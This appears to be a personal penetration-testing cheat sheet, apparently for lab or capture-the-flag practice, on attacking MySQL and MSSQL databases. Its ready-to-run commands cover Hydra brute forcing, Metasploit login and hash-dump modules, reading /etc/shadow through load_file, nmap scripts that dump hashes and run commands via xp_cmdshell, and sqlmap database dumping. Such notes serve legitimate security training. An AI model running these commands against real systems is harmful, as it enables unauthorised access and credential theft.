# Table of Contents
1. [Overview](#Overview)
	1. Ports
	3. Usage
	4. Related Services
2. [Tools](#Tools)
	1. [Hydra](#Hydra)
	2. [Msfconsole](#msfconsole)
	3. [nmap](#nmap)
	4. [sqlmap](#sqlmap)

---
# Overview 

SQL - Simple Query Language

Relational database that is used by a lot of websites to store data.

---
## #Ports
- 3306 : mysql
- 1433 : MSSQL

## Usage
`mysql -h 192.168.34.3 -u root`
- `show database;` : shows databases
- `use books;` : go in to database
- `select count * from authors;` : show authors
- `help;` : help menu
- `select load_file("/etc/shadow");` : can see dir access by user from msfconsole mysql_writable_dirs

## Related Services
- MySql : database
- PostgreSql : database
- MariaDB : database
- MSSql : Microsoft SQL

---

# Tests
- 

# #Tools

## Hydra
dictionary attack
```bash
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_password.txt 192.168.45.3 mysql
```

---

## msfconsole
### MYSQL
1. use auxiliary/scanner/mysql/**mysql_writable_dirs**
	1. set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
	2. setg rhosts 192.168.34.2
	3. setg : set globaly
	4. set verbose false
	5. advanced : advanced options
	6. set password "" : null password
	7. run
3. use auxiliary/scanner/mysql/**mysql_hashdump**
	1. set username root
	2. set password "" : doesn't show in options
	3. run
	4. gives user hashes
5. use auxiliary/scanner/mysql/**mysql_login**
	1. set rhost addr
	2. set pass_file /usr/share/metasploit-framework/data/wordlists/unix_password.txt
	3. set stop_on_success true
	4. set username root
	5. run
#### Useful modules
- auxiliary/scanner/mysql/mysql_version
- auxiliary/scanner/mysql/mysql_login
- auxiliary/admin/mysql/mysql_enum
- auxiliary/admin/mysql/mysql_sql
- auxiliary/scanner/mysql/mysql_file_enum
- auxiliary/scanner/mysql/mysql_hashdump
- auxiliary/scanner/mysql/mysql_schemadump
- auxiliary/scanner/mysql/mysql_writable_dirs

---

### MSSQL
- use auxiliary/scanner/mssql/mssql_login
	- setg rhosts addr
	- set user_file /root/desktop/wordlists/common_users.txt
	- set pass_file /root/dektop/wordlists/100-common-passwords.txt
	- run
- use auxiliary/admin/mssql/mssql_enum
	- run
- use auxiliary/admin/mssql/mssql_enum_sql_logins
- use auxiliary/admin/mssql/mssql_exec
	- set cmd whoami
	- set username sa ???
- use auxiliary/admin/mssql/mssql_enum_domain_accounts
	- run

---

## nmap
### MSQL
- --script
	- mysql-empty-password
		- show users with no pass
	- mysql-info
		- shows capabilities and other info
	- mysql-users
		- --script-args="mysqluser='root',mysqlpass=''"
	- mysql-databases
		- --script-args="mysqluser='root',mysqlpass=''"
	- mysql-variables
		- --script-args="mysqluser='root',mysqlpass=''"
		- look for **datadir:** locations
	- mysql-audit
		- --script-args="mysql-audit.username='root',mysql-audit.password='', mysql-audit.filename='usr/share/nmap/nselib/data/mysql-cis.audit"
	- mysqldump-hashes
		- --script-args="username='root',password=''"
	- mysql-query
		- --script-args="query='select count(\*) from books',username='root',password=''"
### MSSQL
- --script
	- ms-sql-info
		- information
	- ms-sql-ntlm-info
		- `--script-args instance-port=1433`
		- version info
	- ms-sql-brute 
		- ` --script-args userdb=/usr/wordlists/common_users.txt,passdb=/usr/wordlists/100-common-passwords.txt`
	- ms-sql-empty-password
	- ms-query
		- `-script-args mssql.username-admin,mssql.password=anamaria,ms-sql.query.query='SELECT * FROM master..syslogins' -oN output.txt`
	- ms-sql-dump-hashes 
		- `--script-args mssql.username=admin,mssql.password=anamaria`
	- ms-sql-xp-cmdshell 
		- `--script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"`
			- `ms-sql-xp-cmshell.cm="type c:\flag.txt"`
				- type is windows version of cat

---

## sqlmap

#### `Usage: python3 sqlmap [options]`

1. Use burpsuite to intercept a request and save it to a file
2. pass the file to sqlmap
	1. `sqlmap -r request.txt --dbms=mysql --dump`
3. sqlmap will try to find a vulnerability and then dump the database

